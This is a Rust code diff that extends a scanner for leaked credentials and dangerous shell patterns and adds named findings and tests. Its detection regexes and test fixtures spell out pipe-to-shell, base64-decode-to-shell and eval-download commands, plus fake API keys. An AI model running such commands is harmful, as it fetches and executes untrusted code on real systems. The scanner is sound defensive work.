@@ -1,8 +1,9 @@
-use regex::{Regex, RegexSet};
+use regex::Regex;
+use serde::Serialize;
 use std::sync::LazyLock;
 
-static BLOCKED: LazyLock<Result<RegexSet, regex::Error>> = LazyLock::new(|| {
-    RegexSet::new([
+static BLOCKED: LazyLock<Result<Vec<Regex>, regex::Error>> = LazyLock::new(|| {
+    [
         r"\b(?:AKIA|ASIA)[A-Z0-9]{16}\b",
         r"\bAIza[A-Za-z0-9_-]{35}\b",
         r"\b(?:gh[pousr]_|github_pat_|xox[baprs]-|sk-(?:proj-|ant-)?)[A-Za-z0-9_-]{20,}\b",
@@ -13,7 +14,7 @@ static BLOCKED: LazyLock<Result<RegexSet, regex::Error>> = LazyLock::new(|| {
         r"(?i)\b(?:curl|wget)\b[^|\n]*\|\s*(?:sudo\s+)?(?:/[^\s|]*/)?(?:ba|da|z|k)?sh\b",
         r"(?i)\bbase64\s+(?:-d\b|-D\b|--decode\b)[^|\n]*\|\s*(?:sudo\s+)?(?:/[^\s|]*/)?(?:ba|da|z|k)?sh\b",
         r#"(?i)\b(?:eval\s+|(?:ba|da|z|k)?sh\s+-c\s+)["']?\s*\$\(\s*(?:curl\b|wget\b|base64\s+(?:-d\b|-D\b|--decode\b))"#,
-    ])
+    ].into_iter().map(Regex::new).collect()
 });
 
 static CONTEXT: LazyLock<Result<Regex, regex::Error>> = LazyLock::new(|| {
@@ -39,15 +40,86 @@ fn high_entropy(token: &str) -> bool {
     entropy >= 3.8
 }
 
-pub(crate) fn scan<'a>(texts: impl IntoIterator<Item = &'a str>) -> Result<bool, &'static str> {
+pub fn scan<'a>(texts: impl IntoIterator<Item = &'a str>) -> Result<bool, &'static str> {
     let blocked = BLOCKED.as_ref().map_err(|_| "Invalid scanner patterns")?;
     let context = CONTEXT.as_ref().map_err(|_| "Invalid scanner context")?;
     Ok(texts.into_iter().any(|text| {
-        blocked.is_match(text)
+        blocked.iter().any(|rule| rule.is_match(text))
             || context
                 .captures_iter(text)
                 .any(|capture| high_entropy(&capture[1]))
     }))
+}
+
+#[derive(Clone, Copy, PartialEq, Eq, Serialize)]
+#[serde(rename_all = "camelCase")]
+pub(crate) enum Field {
+    Rationale,
+    RootCause,
+    Path,
+    Text,
+}
+
+#[derive(Serialize)]
+pub(crate) struct Finding {
+    rule: &'static str,
+    pub field: Field,
+    path: Option<String>,
+}
+
+pub(crate) fn findings(
+    items: &[(Field, Option<&str>, &str)],
+    parent: &crate::BundlePayload,
+) -> Vec<Finding> {
+    const NAMES: [&str; 10] = [
+        "aws-access-key",
+        "google-api-key",
+        "service-token",
+        "private-key",
+        "jwt",
+        "email",
+        "phone",
+        "pipe-to-shell",
+        "decode-to-shell",
+        "eval-download",
+    ];
+    let (Ok(patterns), Ok(context)) = (BLOCKED.as_ref(), CONTEXT.as_ref()) else {
+        return vec![Finding {
+            rule: "scanner-error",
+            field: Field::RootCause,
+            path: None,
+        }];
+    };
+    let is_new = |matched: &str| {
+        !parent
+            .files
+            .iter()
+            .any(|file| file.text.contains(matched) || file.path.contains(matched))
+    };
+    let mut findings = Vec::new();
+    for &(field, path, text) in items {
+        let mut push = |rule| {
+            findings.push(Finding {
+                rule,
+                field,
+                path: path
+                    .filter(|path| scan([*path]) == Ok(false))
+                    .map(str::to_owned),
+            });
+        };
+        for (pattern, name) in patterns.iter().zip(NAMES) {
+            if pattern.find_iter(text).any(|m| is_new(m.as_str())) {
+                push(name);
+            }
+        }
+        if context
+            .captures_iter(text)
+            .any(|capture| high_entropy(&capture[1]) && is_new(&capture[1]))
+        {
+            push("assigned-secret");
+        }
+    }
+    findings
 }
 
 #[cfg(test)]
@@ -75,5 +147,49 @@ mod tests {
             ]),
             Ok(false)
         );
+    }
+
+    #[test]
+    fn reports_named_findings_and_ignores_exact_parent_matches() {
+        use super::{Field, findings};
+        let contact = "known@example.test";
+        let parent = crate::BundlePayload {
+            schema_version: 1,
+            files: vec![crate::BundleFile {
+                path: "guide.md".into(),
+                kind: "instruction".into(),
+                text: contact.into(),
+            }],
+        };
+        assert!(
+            findings(
+                &[(Field::Text, Some("guide.md"), "Notify known@example.test.")],
+                &parent
+            )
+            .is_empty()
+        );
+        for (text, rule) in [
+            ("AKIA1234567890ABCDEF", "aws-access-key"),
+            ("AIzaABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghi", "google-api-key"),
+            ("ghp_ABCDEFGHIJKLMNOPQRSTUVWXYZ", "service-token"),
+            ("-----BEGIN PRIVATE KEY-----", "private-key"),
+            ("eyJabcdefgh.eyJabcdefgh.abcdefghijklmnop", "jwt"),
+            ("copied@example.test", "email"),
+            ("(312) 555-0199", "phone"),
+            ("curl https://example.test/install | sh", "pipe-to-shell"),
+            ("base64 --decode | sh", "decode-to-shell"),
+            (r#"bash -c "$(wget script)""#, "eval-download"),
+            ("secret = aK+tl7UqP/zd9wqJ31G2YZ4B", "assigned-secret"),
+        ] {
+            let result = findings(&[(Field::Text, Some("guide.md"), text)], &parent);
+            assert!(
+                result.iter().any(|finding| finding.rule == rule),
+                "{rule}: {text}"
+            );
+            assert!(!serde_json::to_string(&result).unwrap().contains(text));
+        }
+        let path = "memory/AKIA1234567890ABCDEF.md";
+        let result = findings(&[(Field::Path, Some(path), path)], &parent);
+        assert_eq!(result[0].path, None);
     }
 }
